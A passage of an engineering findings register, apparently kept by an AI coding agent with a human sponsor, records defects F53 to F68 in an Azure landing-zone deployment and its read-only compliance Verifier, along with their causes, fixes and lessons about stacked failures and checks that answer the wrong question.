**Why it was built that way, which is the part worth keeping.** A reusable-workflow caller
job cannot declare `environment:`, so `infra-up.yml` genuinely cannot see an environment
variable at all - `vars.AZURE_LOCATION` is unresolvable in the very file that fans out to
every layer. The `default: eastus` was a reasonable answer to a real constraint. The fix is
to resolve it one level down, in the layer jobs, which DO declare `environment: demo`:
`${{ inputs.location || vars.AZURE_LOCATION }}`. An explicit input still overrides, for a
one-off.

**Fix:** all fifteen workflow defaults emptied, `up.ps1`'s parameter defaulted to empty, and
the three layers that consume a region now fall back to the environment variable.
`verification/tests/no-hardcoded-region.Tests.ps1` asserts all three properties, and was
mutation-tested by reinstating each one: every mutation is caught by its own assertion and no
other.

### What this says about the method

The register keeps finding the same shape at wider and wider scope, and this one widens it
again: **a value with more than one source has no source.** [F50](#f50) was a count written
twice, once as a map and once as prose. This is a region written sixteen times, where the
one place an operator would naturally set it was outranked by fifteen places nobody reads.

The sponsor found it by asking where a value lived - not by reading a diff, not from a
failing test, and not from the plan, which had been green. That is the second time today a
question about *where something comes from* has surfaced a live defect ([F52](#f52)'s
fabricated GUID was the first). It is a better question than "is this correct?", because a
value with one honest source can be checked, and a value with sixteen cannot.


---

## F54

**Changing the region wedges the landing zone, permanently, by design**

- **Severity:** medium (L2 cannot deploy again after a region change; no wrong state, but no way forward without manual cleanup)
- **Confidence:** CONFIRMED - observed in run 33277220471, ten simultaneous Conflicts
- **Controls:** 3.4.2 (enforce configuration settings)
- **Closed by:** a cleanup step in `layer-02-landing-zone.yml`
- **Status:** CLOSED

**Found while:** the first deploy after [F53](#f53) moved the estate to Central US.

```
MultipleErrorsOccurred: Conflict,Conflict,Conflict,Conflict,Conflict,...
InvalidDeploymentLocation: Invalid deployment location 'centralus'.
  The deployment 'L2-PA-REQUIRE-MANAGEDBY' already exists in location 'eastus'.
```

**A management-group-scope deployment's location is immutable.** The cancelled East US run
had created ten nested `l2-pa-*` deployment records; redeploying the same names into a
different region is refused. And the names *must* be stable - they are what makes replay
idempotent - so every one of them collides at once rather than one informative failure.

The estate was therefore in a state where the region could not be changed *back* either:
whichever region the records were pinned to was the only one L2 would accept.

**Fix:** L2 now lists management-group deployment records whose location differs from the
region being deployed, and deletes those records first. Deleting a deployment record deletes
*history*, never resources - the policy assignments it created are untouched and re-converge
in the deploy step immediately after. Safe to run unconditionally, and it matches nothing on
a normal replay.

This is not an edge case for this repository specifically. [F52](#f52) established that
Azure SQL cannot provision in several regions on a trial subscription, so **changing
`AZURE_LOCATION` is something adopters will have to do** - and without this, L2 is wedged the
moment they do.

### What this says about the method

Three findings in a row now trace to one region change: the region had sixteen sources
([F53](#f53)), the first deploy in the new region was refused by records the previous region
left behind (F54), and the reason for the change at all was that the original region cannot
host the estate ([F52](#f52)). None of them is exotic. All three are what happens the first
time someone does an ordinary thing - move an estate to a different region - that no plan run
and no test had ever done.

The one genuinely good outcome sits alongside them: **the fail-fast gates from
[F52](#f52) worked.** L2 failed and L3 through L8 all skipped, where the equivalent failure
four hours earlier had let L6 build thirteen resources on a landing zone that never applied.
The run cost 2m43s and produced nothing to clean up.


---

## F55

**The guardrails pinned themselves to a region, and only the robot could unpin them**

- **Severity:** high (the estate could not change region without a G3 deletion its human owner had no permission to perform)
- **Confidence:** CONFIRMED - sixteen simultaneous failures in run 33277577651
- **Controls:** 3.4.2 (enforce configuration settings), 3.1.5 (least privilege)
- **Closed by:** decoupling the assignment identity's location from the estate's region
- **Status:** CLOSED

**Found while:** the deploy immediately after [F54](#f54) cleared the stale deployment
records. The records were the *first* immutability. The assignments themselves are a second:

```
InvalidLocationUpdate: The policy assignment 'require-env' request is invalid.
  The existing assignment's location cannot be changed from 'eastus' to 'centralus'.
```

and, for the six that carry a managed identity, a harder one - the identity is registered in
Entra with a region of its own:

```
AlreadyExistServicePrincipalInDifferentRegion: Location mismatch in AAD and in Model.
  LocationInAAD: 'eastus', LocationInModel: 'centralus'
```

Sixteen assignments, all refusing, and no update path: an assignment's location can only be
changed by deleting and recreating it.

**Which nobody present could do.** Deleting management-group policy assignments is
`infra/policy/teardown.ps1`, a G3 action. The sponsor authorised it - and it still could not
run, because the `mls` management group's only Owner is `mls-github-deployer`. The deployer
became Owner automatically by creating the group ([F47](#f47)); nothing ever granted the
human anything. `admin@` cannot delete a policy assignment there, or read one, or list them.
**The estate had reached a state where its owner needed a robot's permission to change his
own governance layer**, and the only route back was a tenant-root elevation toggle.

**The fix is that none of it was necessary.** A policy assignment's `location` says where its
system-assigned identity lives. It has no bearing on what the assignment enforces -
`listOfAllowedLocations` is the parameter that does that, and it updates freely. Coupling the
identity's home to the estate's region is what turned a parameter change into a sixteen-object
deletion. `policyAssignmentLocation` is now separate: empty means "same as the estate", which
is right on a fresh deploy, and it is set explicitly only on an estate whose region has moved
since L2 first ran. The identities stay where they were created, which nothing observes.

### What this says about the method

This is the fourth finding from one region change, and the first that is a **design** error
rather than an operational surprise. [F53](#f53) and [F54](#f54) were things Azure does that
the estate did not know about. This one is a decision the estate made: it bound a value that
does not matter (where an identity lives) to a value that does (where the estate runs), and
the binding was invisible until the two had to differ.

The access gap underneath it is worth carrying separately. An estate whose management group
only its deployer can administer is one where every governance question - *what is actually
assigned? why did that deny fire?* - is unanswerable by the person accountable for it. That
is not a region problem and it did not go away with this fix.


---

## F56

**The landing zone deployed once and could never deploy again**

- **Severity:** high (a kill/rebuild estate whose landing zone is not replayable is not a kill/rebuild estate)
- **Confidence:** CONFIRMED - observed after the F55 fix removed the location conflicts that had been masking it
- **Controls:** 3.4.2 (enforce configuration settings), 3.12.1 (assess controls)
- **Closed by:** clearing the grants in L2 before converging
- **Status:** CLOSED

**Found while:** the deploy after [F55](#f55) pinned every assignment's location. That fix
worked - the sixteen `InvalidLocationUpdate` errors vanished - and revealed what they had
been hiding:

```
RoleAssignmentExists: The role assignment already exists.
  The ID of the existing role assignment is 346a8f81ef665af79185bcdf4b4be449
```

The reported ids matched the grants **already live at the management group**, held by six
service principals that resolve, healthy, to `inherit-env`, `inherit-app`, `inherit-owner`,
`inherit-costcenter`, `inherit-dataclass` and `inherit-managedby` - the modify policies'
own managed identities. Nothing was orphaned or misconfigured.

`avm/ptn/authorization/policy-assignment:0.5.3` - the newest published version; there is no
upgrade to take - generates a **new GUID for that grant on every run**. Azure keys a role
assignment on `(scope, principal, role)`, so the second run is refused as a duplicate of the
first. **The layer deploys once and fails on every replay.**

That is fatal for this estate specifically. The whole demo rests on
`docs/runbooks/kill-rebuild.md`: tear the thing down, put it back, prove the clock. A
landing zone that converges exactly once cannot do that, and nobody had noticed because
until 2026-08-30 L2 had never been asked to run twice against a tenant where it had already
succeeded.

**Fix:** L2 deletes the Tag Contributor grants at the management group immediately before
deploying, and the deploy recreates all six in the same run. Pinning our own deterministic
name would not have helped - the conflict is the triple, not the name, so delete-then-create
is the only convergent order. The scope is narrow by construction: nothing except those six
modify policies grants Tag Contributor at that management group. The step verifies the
grants are gone and fails loudly rather than handing a doomed deploy to the next step.

### What this says about the method

Each fix tonight has revealed the next defect, which reads like thrash and is not: the
failures were **stacked**, and only the top one is ever visible. The fabricated GUID
([F52](#f52)) hid the deployment-record conflict ([F54](#f54)), which hid the assignment
location conflict ([F55](#f55)), which hid this. No amount of care at any one step would
have surfaced the one underneath - only running it again would.

The uncomfortable part is that **five of these six had never been executed even once** before
tonight. `up.ps1` had been run in plan mode repeatedly and reported green; a plan cannot
reach any of them. The estate's real first deployment was not a test of the deployment - it
was the first time most of this code had ever run at all.


---

## F57

**The Verifier could not see the layer it signs off, and waited an hour to not say so**

- **Severity:** high (L2 could never be verified, and the failure mode was a timeout with no report rather than a FAIL)
- **Confidence:** CONFIRMED - the audit job ran 00:36:53 to 01:37:03, exactly the 60-minute job timeout, and was cancelled
- **Controls:** 3.1.5 (least privilege), 3.12.3 (monitor controls on an ongoing basis)
- **Closed by:** a Reader grant in L2, and treating permission failures as final
- **Status:** CLOSED

**Found while:** the first deploy where L2 actually succeeded. Its audit then ran for exactly
sixty minutes and was killed by the runner.

It was not slow. **`mls-verifier` has no role assignment at the `mls` management group** - it
is Reader at *subscription* scope, and a management group is not in that scope. Every V2.x
criterion that reads MG state threw `AuthorizationFailed`. The layer whose entire output
lives at the management group could not be verified at all, and never could have been.

**And the audit could not tell "not yet" from "never".** `Invoke-MlsCriterion` retries a
thrown check for the declared propagation window, which is right for an object that has not
appeared yet and useless for a permission error - waiting cannot turn *forbidden* into
*permitted*. Each failing criterion burned its whole window in turn until the job timeout
killed the run, so the outcome was **no report at all** rather than an actionable FAIL naming
the missing grant. That is strictly worse than failing: a cancelled job looks like
infrastructure flakiness, and this one had already been read as "the propagation retry is
working" earlier the same night.

**Fix, in two parts.** Permission failures are now `-Final`: matched on
`AuthorizationFailed`, `Authorization_RequestDenied`, `InsufficientPrivileges`, `Forbidden`
and `403`, they stop the retry loop immediately and report what cannot be seen. And L2 grants
`mls-verifier` **Reader** on the management group - Reader, not Contributor, because the
Verifier's independence is that it can only look; the grant widens what it can look *at*,
never what it can do. It is made by L2 rather than `01-root-oidc.ps1` because the human
running that script has no authority there either: the deployer created the group and is its
only Owner, so the deployer is the only principal that can delegate.

### What this says about the method

This is [F51](#f51) again in a more expensive form. There, a gate could never pass and its red
result was read as wallpaper. Here, a gate could never *finish*, and its cancellation was read
as a slow propagation window - by me, in this session, an hour before I looked at the
timestamps and saw 00:36:53 to 01:37:03 was not a coincidence.

**A signal that cannot distinguish "not yet" from "never" will eventually spend its entire
budget telling you nothing.** The retry window existed for a real reason - Azure policy
genuinely does take minutes to propagate, and [F46](#f46) warned against calling propagation a
defect. The error was applying that patience to a class of failure where patience is
meaningless, and the cost was the one report anybody actually needed.

---

## F58

**The audit destroyed its own evidence, four different ways, whenever it ran out of time**

- **Severity:** high (every timed-out audit produced nothing at all - no report, no transcript, no reason - so the estate's own verification layer was blind exactly when it mattered)
- **Confidence:** CONFIRMED - run 33287461494, L2 deployed, its audit ran 02:21:56 to 03:21:55 and was killed at the 60-minute job timeout having printed exactly one line
- **Controls:** 3.3.1 (create and retain audit records), 3.12.3 (monitor controls on an ongoing basis)
- **Closed by:** a streamed transcript, outputs declared before the run, bounded transports, and a run-level retry budget
- **Status:** CLOSED

**Found while:** the first run after [F57](#f57) was fixed. L2 deployed *and replayed* -
[F56](#f56) confirmed by execution rather than argument - and then the audit was cancelled at
exactly sixty minutes for the second night running.

[F57](#f57) had removed one reason an audit could burn its whole window. It had not removed
the reason an audit that burns its window tells you nothing. **Four independent severances,
one symptom:**

1. **The transcript was published only on exit.** `pwsh ... > "$transcript"` followed by
   `cat` prints nothing while the audit runs and everything after it finishes - so a
   cancellation discarded every line it had produced. Sixty minutes of work, one line of log.
2. **`ran=true` was written only on exit.** The caller uploads on
   `always() && steps.audit.outputs.ran == 'true'`. An output written after the process does
   not exist when the process is killed, so `ran` was empty, the `always()` was defeated by
   its own second clause, and the partial reports already on disk were never uploaded either.
3. **`az` had no timeout, and its stderr went to `$null`.** One call that never returns holds
   the audit forever: the retry loop above it never gets another turn. The cancelled job's
   cleanup line - `Terminate orphan process: pid (3399) (python3)` - is that call, still
   running. `az` is Python.
4. **The run had no retry budget.** Each criterion's window was bounded; their sum was not.
   L2 declares three criteria at the standard 30 minutes, so the worst case was 90 minutes
   inside a 60-minute job. There was never margin: V2.3 legitimately waits out the NIST
   assignment's own 30-minute scan, so **one** unexpected failure anywhere else in the layer
   was enough to reach the runner's limit.

**Fix.** The transcript streams through `tee` and the exit code comes from `PIPESTATUS[0]`,
so the audit's own verdict still gates the job. `ran` and `report` are declared *before* the
run, because that the script will run is knowable then. Both transports go through one
bounded runner with a per-call ceiling that captures stderr and reports *why* - and a timeout
throws even under `-AllowFailure`, because "allowed to come back empty-handed" and "we never
found out" are not the same answer. And the context now carries a run deadline: a criterion's
window is clamped to the time actually left, it still runs once, and when its window was cut
short the row says `run budget exhausted` rather than reading like a window that completed.

`verification/tests/audit-run-budget.Tests.ps1` holds the budget against the job timeout that
kills it - the two numbers live in different files, and nothing but a test keeps them
related.

### What this says about the method

The composite action's own header comment describes fixing this bug in August: `ran=true`
"was never written on a failure - so the caller's upload was skipped exactly when the report
mattered most." That fix was real, and it was half. It repaired the case where the audit
*exits* non-zero and left untouched the case where it never exits at all - which is the same
defect, one step further out, and the one where the evidence is scarcer and worth more.

**This register keeps finding the same shape: a fix aimed at what the error named rather than
at what the error implied.** [F49](#f49) turned strict mode on in one test directory of
three. [F54](#f54) cleared one scope of two. [F55](#f55) pinned two policy-assignment modules
of six. Here, an upload was repaired for failure and not for cancellation. Every one of them
looked complete against the incident that produced it, and every one left the general case
standing.

There is a sharper lesson in how long this took to see. The reason the retry-budget
arithmetic - three criteria, thirty minutes each, sixty-minute job - was worked out from the
*source* rather than the log is that **the log did not survive**. Defect 3 was undiagnosable
because of defect 1: the tool that reports on the estate could not report on itself. An
observability failure does not merely accompany the other failures in its blast radius, it
conceals them, and it is the only class of defect that gets *harder* to find as it gets
worse.

So the ordering rule this establishes: **fix the thing that reports before fixing the thing
that failed.** A cancelled job that streams its transcript is a bad afternoon. A cancelled
job that streams nothing is a second night.

---

## F59

**Nineteen criteria inherited a patience nobody chose for them, and one of them answered wrong**

- **Severity:** high (V2.1 returned a FAIL contradicted by the deploy log in the same run, and took thirty minutes to do it - a wrong verdict is worse than no verdict, because it gets believed)
- **Confidence:** CONFIRMED - run 33307710207: V2.1 FAILed after 7 attempts over 1806.9 s, while that run's own deploy log showed the subscription placed under the management group and the Verifier already holding Reader
- **Controls:** 3.12.1 (assess controls periodically), 3.12.3 (monitor controls on an ongoing basis)
- **Closed by:** a short default window with patience opted into per criterion, and a V2.1 that reports what it saw
- **Status:** CLOSED

**Found while:** reading the first L2 audit report that ever existed - the one [F58](#f58)
made possible. The report was the point, and the first thing it did was disagree with the
run that produced it.

**Two defects, and they compounded.**

**V2.1 could not tell "denied" from "absent".** It read the management group with
`-AllowFailure`, which turns any az failure into `$null`, and then reported that `$null` with
the same sentence as a genuinely empty result: *"does not report the demo subscription as a
child (or the MG read was denied)"*. That parenthetical is not a finding, it is two findings
the criterion could not separate. Worse, `--query` projected the answer away inside az, so the
report could say only that the projection came back empty - never what the management group
actually contained. Ground truth was forty minutes earlier in the same run's deploy log:
`"parent": {"id": "/providers/Microsoft.Management/managementGroups/mls"}` and
`Verifier already holds Reader on mls.`

**And it spent thirty minutes being wrong**, because it inherited the standard window.
`$script:StandardRetryWindowMinutes = 30` was the DEFAULT, applied to every criterion that
did not say otherwise - **19 of the 47 criteria in this repo**. Thirty minutes is right for a
handful of genuinely slow, eventually consistent checks. It is absurd for one whose answer is
settled the moment `az account management-group subscription add` returns. The cost was never
one criterion either: L3 declares four, none of them explicit, which is two hours inside a
sixty-minute job.

**Fix.** V2.1 drops `-AllowFailure` and drops `--query`: az throws with its own stderr (and
the criterion loop marks a permission failure Final, per [F57](#f57)), the children are
filtered in-process, and a FAIL now names what WAS there - `its children are: X [type]`, or
`it lists no children at all`. And the default window is now **5 minutes, polled every 20
seconds**, with patience opted into: all nineteen implicit criteria now declare a window taken
from their own runbook - 45 for L3's Entra propagation, 30 for L4's label replication, 15 for
L7's App Insights ingestion - each with the reason beside it.

The poll interval mattered as much as the window. At 300 s a criterion that became true at
t=10 s still waited five minutes, so every propagation-lagged check paid the full interval
even when it converged immediately.

`audit-run-budget.Tests.ps1` now holds two invariants: no criterion may declare more patience
than the whole run has, and **no criterion may inherit its window silently**.

### What this says about the method

The sum-of-windows arithmetic is the wrong model, and the first version of that test enforced
it anyway. Propagation is *shared wall clock*: once V3.1 has waited out 45 minutes, the
objects V3.2 reads have had 45 minutes too. Summing declared windows would have forced every
layer's criteria artificially small to satisfy a budget they were never going to spend
together. What is never defensible is one criterion that can eat the entire budget and leave
the rest of the layer unmeasured - so that is what the test asserts instead.

Two of the guards written for this finding **survived their first mutation**, and both for the
same reason: they tested the harness rather than the code.

- The denied-read test mocked `Invoke-MlsAz` to *throw regardless of `-AllowFailure`*. Restoring
  the bug changed nothing, because the mock was supplying the behaviour under test. It passes
  only now that the mock honours the real contract and returns `$null` when the flag is set.
- The window-inventory parser read `-RetryWindowMinutes` as a numeric literal, so V6.4's
  `-RetryWindowMinutes $SqlIdleWindowMinutes` - a properly declared window held in a variable -
  counted as an orphan. **Declared** and **readable from here** are different questions.

CLAUDE.md already says a test that supplies the answer it is checking is a mirror, not a test.
Mutation testing is how a mirror gets caught, and it caught two in one change. A guard nobody
has tried to break is a guard nobody has tested.

---

## F60

**The CLI asked to register a provider before it would read, and a Reader cannot ask**

- **Severity:** medium (V2.1 failed with a message about provider registration on a subscription while claiming to be a statement about a management group's children)
- **Confidence:** CONFIRMED - run 33313700780, and `az provider show -n Microsoft.Management` reports `Registered`, so the registration the CLI attempted was not even needed
- **Controls:** 3.1.5 (least privilege), 3.12.3
- **Closed by:** reading ARM directly instead of through the CLI's management-group wrapper
- **Status:** CLOSED

`az account management-group show` attempts `Microsoft.Management/register/action` at
SUBSCRIPTION scope before it reads. The Verifier holds Reader, a register action is not a
read, and so the call failed - with an error naming a subscription and an action nobody had
asked for, about a criterion that is a statement about a management group.

The provider was already registered. The CLI asks anyway.

`az rest --method get` against the Management API is the same read with none of the wrapper:
it needs `Microsoft.Management/managementGroups/read` and nothing else, which is exactly what
[F57](#f57)'s Reader grant provides. `Assert-MlsReadOnlyAzArgument` already permitted
`rest --method get`, so the guard needed no widening - the capability was there the whole time.

---

## F61

**L2 could never pass on a fresh estate, and everything downstream was gated on L2**

- **Severity:** high (the entire layer sequence was unreachable past L2 on exactly the estate the demo claims to rebuild in under an hour)
- **Confidence:** CONFIRMED - `az policy assignment list` shows `nist-800-53-r5` assigned; `az policy state summarize` returns 0 rows; `az resource list` returns 0
- **Controls:** 3.12.1, 3.12.3
- **Closed by:** splitting V2.3 into what is knowable now and what depends on resources that do not exist yet
- **Status:** CLOSED

V2.3 required NIST compliance DATA. Azure Policy produces compliance data by evaluating
resources. On a fresh estate there are none, so the query correctly returns nothing:

```
V2.3 needs compliance data
  -> compliance data needs resources
    -> resources are deployed by L3-L8
      -> L3-L8 are gated on L2's audit
        -> L2's audit is V2.3
```

A kill/rebuild starts empty by definition, which is the whole premise of the estate. **Every
run stopped in the same place for this reason**, and each night it was read as whatever
defect had been found most recently - a missing grant, a truncated window, a blind error
message. Those were all real. None of them was this.

**Fix.** The ASSIGNMENT existing is L2's own deliverable, depends on nothing downstream, and
is answerable the moment the layer deploys - so its absence is a `-Final` FAIL. Compliance
DATA is a consequence of later layers, so on an estate with zero resources V2.3 records SKIP
with its reason and the layer proceeds. With resources present and no summary, it FAILs as
before.

### What this says about the method

Four defects in a row were found by asking why L2's audit failed, and each was genuinely
there. The fifth was the one that had been stopping the run the entire time, and it was
invisible precisely because the other four kept producing plausible explanations. **A failure
that always reproduces is not necessarily one failure.** Fixing the top of the stack is what
lets the next one become visible - which is [F58](#f58)'s stacking lesson again, one level up:
the stack was not four deep, it was five, and the bottom item was a design error rather than a
bug.

---

## F62

**The GUID allowlist did not exist, so the check that depends on it was permanently red**

- **Severity:** medium (V1.3 reported 195 hits across 57 ids on every run and had never once been actionable)
- **Confidence:** CONFIRMED - `verification/guid-allowlist.txt` was absent from the repository
- **Controls:** 3.1.1, 3.4.1
- **Closed by:** a reviewed allowlist with provenance, plus a guard against laundering real ids into it
- **Status:** CLOSED

V1.3 sweeps the repository for GUIDs and fails on any not in a reviewed allowlist. That file
was never created, so every GUID in the repository was unexpected - Graph app-role ids, Azure
RBAC role definitions, policy definitions, Entra role templates, and invented fixture data.
The criterion was red from the first run and stayed red, which is the same thing as being
absent.

**What V1.3 is actually for was never in danger.** Checked before writing the list: the tenant
id, subscription id, deployer client id, Verifier object id and sponsor object id appear in
**zero** committed files. They live in GitHub environment variables, as CLAUDE.md hard rule 5
requires.

**But an allowlist changes the incentive.** Before it, the only way to make V1.3 green was to
stop committing the id. After it, adding a line is cheaper. So the live identifiers are
checked against the list FIRST, and finding one there is its own `-Final` failure: an
allowlist that can hide a real identifier is worse than no allowlist.

Writing that guard immediately caught its own test suite, which injected repeating-digit ids
that appear throughout the fixtures and are therefore allowlisted - so every test looked like
laundering. The tests now use identifiers shaped like real ones.

Noted and not fixed: `.gitleaks.toml` carries most of these same GUIDs in its own allowlist.
One list, two files, and V1.3 read neither.

---

## F63

**Two L1 criteria reported conclusions their evidence did not support**

- **Severity:** medium (V1.1 failed whenever any unrelated layer failed; V1.2 reported a control as off when it could not see it)
- **Confidence:** CONFIRMED - run 33309963273: V1.1 observed `run ... conclusion=failure; job oidc-login conclusion=success`; V1.2 observed two empty status strings
- **Controls:** 3.12.3, 3.14.6
- **Closed by:** gating V1.1 on the job it measures, and making V1.2 distinguish unreadable from disabled
- **Status:** CLOSED

**V1.1** asked whether the OIDC token exchange works and gated on the RUN concluding success
as well as the job. The run's conclusion covers L2 through L8. So on the run that exposed it,
`oidc-login` had succeeded and L2's audit had not, and L1 reported the token exchange as
broken. **A criterion that fails for reasons outside what it measures is not measuring it.**
The job is now the verdict; the run's conclusion stays in the observed value as context.

**V1.2** read `security_and_analysis` from the repository API. GitHub returns that block only
to a token with ADMIN on the repository, and `MLS_VERIFIER_GH_TOKEN` is read-only by
contract - so the block was absent, both lookups produced empty strings, and the criterion
compared an empty string to `enabled` and reported both settings as empty. That reads as
*both settings are off*. It meant *this identity cannot see them*.

Same confusion as [F57](#f57) in a different API, and the same rule applies: waiting will not
turn unreadable into readable, and neither will re-running. V1.2 now says which one it is, and
names the two honest ways forward - grant the token admin, or move the criterion to an
identity that has it.

---

## F64

**An installed SDK was treated as a signed-in one, so a working fallback was unreachable**

- **Severity:** medium (every Graph criterion threw instead of running, on a runner where the alternative transport was already authenticated)
- **Confidence:** CONFIRMED - run 33309963273, V1.4 observed `check threw: Authentication needed. Please call Connect-MgGraph.`
- **Controls:** 3.12.3
- **Closed by:** testing for a live Graph context rather than a resolvable cmdlet
- **Status:** CLOSED

`Invoke-MlsGraph` preferred the Graph PowerShell SDK whenever `Invoke-MgGraphRequest`
resolved, and fell back to `az rest` otherwise. The CI runner has the Graph module installed
and never calls `Connect-MgGraph`. So the cmdlet resolved, the SDK path was taken, and it
threw - while the `az rest` fallback beneath it, which would have worked because the job is
already OIDC-logged-in as `mls-verifier`, was unreachable by construction.

**Presence is not readiness.** The check is now a live `Get-MgContext`, and a signed-in SDK
call that fails anyway falls through to `az rest` rather than ending the criterion - because
the point of having two transports is that one of them working is enough.

The test that covered this asserted *"uses the SDK when the SDK is present"*: the defect
written down as a contract, passing forever. It is now three tests - present and signed in,
present and not signed in, signed in but failing.

---

## F65

**A branch named after an unchanged commit is not a unique branch**

- **Severity:** medium (the nightly compliance job was red every night and 23 orphan branches accumulated)
- **Confidence:** CONFIRMED - run 33288325859 rejected the push to `compliance-state/be6f55fb...` as non-fast-forward
- **Controls:** 3.4.1, 3.12.3
- **Closed by:** one force-updated branch instead of one per commit
- **Status:** CLOSED

`compliance.yml` commits a dated state artifact and pushes to `main`, with a branch-and-PR
fallback for when branch protection refuses. The protection landed - the workflow's own
comment predicted it - and the fallback ran. The fallback names its branch after the commit
SHA, which looks unique and is not: the nightly schedule runs against whatever `main` is, so
an unchanged `main` produces the SAME branch name with DIFFERENT content the next night. The
second push is refused non-fast-forward, `set -e` kills the step, the job goes red.

Meanwhile the workflow deliberately cannot open the pull requests, because that needs an
Actions setting which also grants self-approval. So 23 branches accumulated, none merged, and
the artifact never landed.

**Fix:** one `compliance-state` branch, force-updated with `--force-with-lease`, and an
existing open PR treated as the normal case rather than an error. One PR that updates in
place, and nothing to accumulate.

### What this says about the method

The comment above that code correctly predicted branch protection landing and correctly
described what would break. It did not predict the collision, because the branch name *looks*
unique - it contains a commit SHA. The variable that makes it unique is the one thing a
scheduled workflow does not vary.

---

## F66

**The check cannot see the control it verifies, and the least-privilege fix I reached for does not exist**

- **Severity:** medium (V1.2 cannot be evaluated by a read-only identity; the control itself has been enabled throughout)
- **Confidence:** CONFIRMED - under an admin token the repository reports `secret_scanning: enabled` and `secret_scanning_push_protection: enabled`, so the control was on the whole time and only the Verifier could not see it
- **Controls:** 3.1.5 (least privilege), 3.14.6
- **Closed by:** reporting the limitation as SKIP, naming the one credential that would resolve it, and NOT widening the Verifier
- **Status:** CLOSED

[F63](#f63) established that V1.2's empty result meant *this identity cannot read the
setting*, not *the setting is off*. This is the question that left open: how should a
read-only Verifier read a setting GitHub returns only to a caller holding repository
administration?

**The first answer - grant `MLS_VERIFIER_GH_TOKEN` admin - is wrong**, and stays wrong.
GitHub's administration permission includes WRITE: settings, collaborators, deletion. The
Verifier's entire contract is that it cannot write (CLAUDE.md hard rule 1), and
[F57](#f57) turned this exact trade down once already: *"Reader, not Contributor - this grant
widens what it can look AT, never what it can do."*

**The second answer was to scope the job's own `GITHUB_TOKEN` to `administration: read` -
ephemeral, repository-scoped, expiring with the job. That permission scope does not exist.**
`administration` is a fine-grained PAT permission; the workflow token's scopes are `actions`,
`checks`, `contents`, `id-token`, `security-events` and a dozen others, and `administration`
is not among them. The repository's own `actionlint` step rejected it before it merged.

**So the honest answer is that a read-only identity cannot verify this control through this
API at all.** V1.2 now records SKIP - never silent, never failing the run - naming what it
could not see and the single thing that would change it: a fine-grained PAT scoped
`Administration: Read-only`, supplied as `MLS_REPO_SETTINGS_TOKEN`. That would be a seventh
long-lived credential, which CLAUDE.md hard rule 5 says needs a written reason, and choosing
to add one is a human's call rather than an audit's convenience. `Invoke-MlsGh -Token` exists
to run that one call under it, restoring the ambient credential afterwards, so the capability
is ready if the decision is made.

### What this says about the method

Two things, and the second is about me.

**The control was enabled the entire time.** Secret scanning and push protection have been on
throughout, and V1.2 has been reporting red about them for as long as it has existed. The
finding was never the estate's posture; it was an auditor that could not reach the evidence
and phrased that inability as a verdict.

**And the fix I proposed was itself unverified.** I asserted that `administration: read` was
"a documented `GITHUB_TOKEN` scope" - confidently, in the commit message and to the sponsor -
without checking. It is not. This register's own standing rule is that **a constant which
names something in another system is verified against that system, not written from memory**,
and a permission scope is exactly such a constant. `actionlint` is the check that resolves it,
it ran, and it caught this in seven seconds.

That is the register's oldest lesson landing on the person maintaining it: the reason the
rule exists is that plausible-sounding constants are precisely the ones nobody checks.

---

## F67

**Both objects were visible, and the write that links them still failed**

- **Severity:** high (L3 died on its first group membership, on the first run that ever reached L3)
- **Confidence:** CONFIRMED - run 33321360624: `POST /v1.0/groups/d3ed81c0-.../members/$ref` returned 404 `Request_ResourceNotFound`, immediately after `Wait-EntraPropagation` had confirmed both the group and the user were visible
- **Controls:** 3.1.1 (limit system access to authorised users), 3.12.1
- **Closed by:** retrying the membership write for the same propagation budget the creates already use
- **Status:** CLOSED

**Found while:** the first run to get past L2. [F61](#f61) unblocked the sequence, L2 verified,
and L3 executed for the first time in the project's life. It failed on its first membership.

`apply-entra.ps1` already handles Entra propagation, and handles it well: `Wait-EntraPropagation`
polls after each create until the object is VISIBLE, replacing what used to be a blind
`Start-Sleep`. Both the user and the group had passed that probe.

**The probe asks a weaker question than the write needs.** Visibility is a GET returning the
object. `POST groups/{id}/members/$ref` needs a replica that can resolve BOTH directory
objects and link them, and Microsoft Graph answers 404 `Request_ResourceNotFound` when it
cannot - naming the group, though the message itself hedges: *"or one of its queried
reference-property objects are not present"*. So the failure named one thing and could have
meant either, which is the pattern this register keeps recording.

**Fix.** The membership write retries on that 404 for the same propagation budget the creates
use. Every other failure is raised immediately - a 403 does not become a 200 by waiting, and
retrying everything would convert a permission problem into a timeout, which is exactly
[F57](#f57)'s mistake. On exhaustion the error says *directory replication rather than a
missing object*, because an operator needs to tell "your manifest names a user that does not
exist" from "the directory has not caught up".

### What this says about the method

**A readiness check that does not check the thing that has to be ready is a delay, not a
guard.** The code was not missing propagation handling; it had careful, purpose-built
propagation handling, and that handling verified a precondition adjacent to the one the next
operation actually required. That is harder to spot than an absent check, because the code
reads as though the problem was already solved - and it was, for the creates.

This is also the fourth consecutive finding whose shape is *the signal answers a different
question than the one being asked*: [F60](#f60)'s registration error standing in for a
management-group read, [F63](#f63)'s run conclusion standing in for a job's, [F64](#f64)'s
installed SDK standing in for a signed-in one, and now a visibility probe standing in for a
linkability one. Worth naming as a class: **when a check and the operation it protects are
not asking the same question, the check will pass at exactly the moment it matters.**

---

## F68

**The fix for a test fixture put three new GUIDs in the repository the sweep exists to guard**

- **Severity:** low (V1.3 red on the next live run; no real identifier involved)
- **Confidence:** CONFIRMED - verify-l1 run at 16:14 reported `3 non-allowlisted GUID hit(s)` naming `verification/tests/layer-01-audit.Tests.ps1:48`
- **Controls:** 3.1.1, 3.4.1
- **Closed by:** generating the test identifiers instead of committing them, plus a local guard
- **Status:** CLOSED

[F62](#f62) added the GUID allowlist and a rule that a live identifier appearing on it is
itself a failure. Writing that guard immediately broke the L1 tests, which injected
repeating-digit ids that ARE allowlisted (they appear throughout the fixtures) and so looked
like laundering. The fix was to give the tests identifiers shaped like real ones.

**Those were three GUID literals, in a committed file, that nobody added to the allowlist.**
V1.3 sweeps the repository for exactly that and flagged them on the next live run - correctly.
A test fixture is a committed file like any other, and the sweep does not care what a file is
for.

**Fix:** the tests now call `[guid]::NewGuid()`. A generated id is both of the things the test
needs - never committed, so the sweep never sees it, and never allowlisted, so it still
exercises the laundering guard - and a fresh one each run is a stronger fixture than a
constant. A new Pester test asserts that every committed GUID is on the allowlist, so the
same mistake costs a second locally rather than a deploy.

### What this says about the method

Three fixes in a row each created the next problem: [F62](#f62)'s allowlist broke the tests,
the test fix committed new GUIDs, and the sweep caught those. That is not a criticism of the
sequence - **it is what a working check looks like from the inside.** V1.3 found a real
violation of its own rule within one run of the rule existing, in code written by the person
who wrote the rule.

